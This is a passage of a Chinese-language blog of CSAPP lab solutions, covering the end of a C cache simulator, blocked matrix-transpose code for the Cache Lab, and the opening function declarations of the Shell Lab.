keyword">if</span><span class="token punctuation">(</span>verbose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" eviction"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>evictions<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">AccessMemory</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> addr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//这个地方使用掩码提取而不是直接移位,是因为算术右移会使标记发生变化.</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> mask<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//注意制作掩码的时候的常数类型LL</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1LL</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> Setindex <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> addr<span class="token punctuation">)</span> <span class="token operator">>></span> b<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// mask = (1LL &lt;&lt; b) - 1;</span>    <span class="token comment" spellcheck="true">// int blockoffset = mask &amp; addr;</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1LL</span> <span class="token operator">&lt;&lt;</span> t<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> tag <span class="token operator">=</span> <span class="token punctuation">(</span>addr <span class="token operator">>></span> <span class="token punctuation">(</span>s <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">;</span>    CacheLine<span class="token operator">*</span> CacheSet <span class="token operator">=</span> Cache<span class="token punctuation">[</span>Setindex<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LRtime <span class="token operator">=</span> CacheSet<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>time<span class="token punctuation">;</span>    <span class="token keyword">int</span> LRid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>E<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">miss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>            CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>time <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tag<span class="token operator">==</span>tag<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">hit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>time <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>time<span class="token operator">&lt;</span>LRtime<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            LRtime <span class="token operator">=</span> CacheSet<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>time<span class="token punctuation">;</span>            LRid <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">miss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CacheSet<span class="token punctuation">[</span>LRid<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>        CacheSet<span class="token punctuation">[</span>LRid<span class="token punctuation">]</span><span class="token punctuation">.</span>time <span class="token operator">=</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">eviction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> trace <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> optc<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>optc <span class="token operator">=</span> <span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token keyword">const</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">,</span><span class="token string">"vs:E:b:t:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>optc<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>                s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token punctuation">:</span>                E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token punctuation">:</span>                b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token punctuation">:</span>                trace <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">strcpy</span><span class="token punctuation">(</span>trace<span class="token punctuation">,</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token punctuation">:</span>                verbose <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    t <span class="token operator">=</span> <span class="token number">64</span><span class="token operator">-</span>s<span class="token operator">-</span>b<span class="token punctuation">;</span>    <span class="token function">Cache_Init</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>E<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> tracefile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>trace<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> opt<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> addr<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span>tracefile<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">" %c %llx,%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>opt<span class="token punctuation">,</span><span class="token operator">&amp;</span>addr<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'I'</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'L'</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> <span class="token string">'S'</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %llx,%d"</span><span class="token punctuation">,</span>opt<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'M'</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %llx,%d"</span><span class="token punctuation">,</span>opt<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">AccessMemory</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printSummary</span><span class="token punctuation">(</span>hits<span class="token punctuation">,</span>misses<span class="token punctuation">,</span>evictions<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>trace<span class="token punctuation">)</span><span class="token punctuation">;</span>    trace <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>groupcount<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>Cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">free</span><span class="token punctuation">(</span>Cache<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>完成的截图<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182159330.png"></p><h2 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h2><p><a href="https://zhuanlan.zhihu.com/p/387662272">https://zhuanlan.zhihu.com/p/387662272</a></p><h3 id="32x32"><a href="#32x32" class="headerlink" title="32x32"></a>32x32</h3><h4 id="暴力转置"><a href="#暴力转置" class="headerlink" title="暴力转置"></a>暴力转置</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">transpose_submit</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> M<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tmp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452391.png"></p><h4 id="分块转置"><a href="#分块转置" class="headerlink" title="分块转置"></a>分块转置</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">transpose_submit</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">int</span> i1<span class="token punctuation">,</span>j1<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>j<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j1 <span class="token operator">=</span> j<span class="token punctuation">;</span>j1<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token operator">++</span>j1<span class="token punctuation">)</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>i1 <span class="token operator">=</span> i<span class="token punctuation">;</span>i1<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token operator">++</span>i1<span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452306.png"></p><h4 id="分块-变量存储"><a href="#分块-变量存储" class="headerlink" title="分块+变量存储"></a>分块+变量存储</h4><p>A和B矩阵相同下标的元素映射到缓存的同一组(回忆一下缓存的分组机制)<br>所以对于对角线上的元素,AB的连续访问发生冲突.<br>这里可以用空间换时间,一次将进入缓存的一整行读出来保存到临时变量中.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">transpose_submit</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">int</span> j1<span class="token punctuation">;</span>    <span class="token keyword">int</span> val1<span class="token punctuation">,</span>val2<span class="token punctuation">,</span>val3<span class="token punctuation">,</span>val4<span class="token punctuation">,</span>val5<span class="token punctuation">,</span>val6<span class="token punctuation">,</span>val7<span class="token punctuation">,</span>val0<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>j<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j1 <span class="token operator">=</span> j<span class="token punctuation">;</span>j1<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token operator">++</span>j1<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                val0 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                val1 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val2 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val3 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val4 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val5 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val6 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                val7 <span class="token operator">=</span> A<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val0<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val1<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val2<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val3<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val4<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val5<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val6<span class="token punctuation">;</span>                B<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span> <span class="token operator">=</span> val7<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241453434.png"></p><h3 id="64x64"><a href="#64x64" class="headerlink" title="64x64"></a>64x64</h3><p>按照8x8分块,块的内部会发生冲突,于是使用4x4分块.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> transpose_submit_desc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Transpose submission"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">transpose_submit</span><span class="token punctuation">(</span><span class="token keyword">int</span> M<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">,</span> <span class="token keyword">int</span> A<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> B<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token keyword">int</span> i1<span class="token punctuation">,</span>j1<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>j<span class="token operator">+</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>M<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j1 <span class="token operator">=</span> j<span class="token punctuation">;</span>j1<span class="token operator">&lt;</span>j<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token operator">++</span>j1<span class="token punctuation">)</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>i1 <span class="token operator">=</span> i<span class="token punctuation">;</span>i1<span class="token operator">&lt;</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token operator">++</span>i1<span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">[</span>i1<span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i1<span class="token punctuation">]</span><span class="token punctuation">[</span>j1<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241548256.png"></p><h1 id="Lab6-Shell-lab"><a href="#Lab6-Shell-lab" class="headerlink" title="Lab6:Shell lab"></a>Lab6:Shell lab</h1><p>实现一个有工作分配,信号处理,进程回收的shell.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306190955121.png"></p><h2 id="部分实现"><a href="#部分实现" class="headerlink" title="部分实现"></a>部分实现</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* Here are helper routines that we've provided for you */</span><span class="token keyword">int</span> <span class="token function">parseline</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> 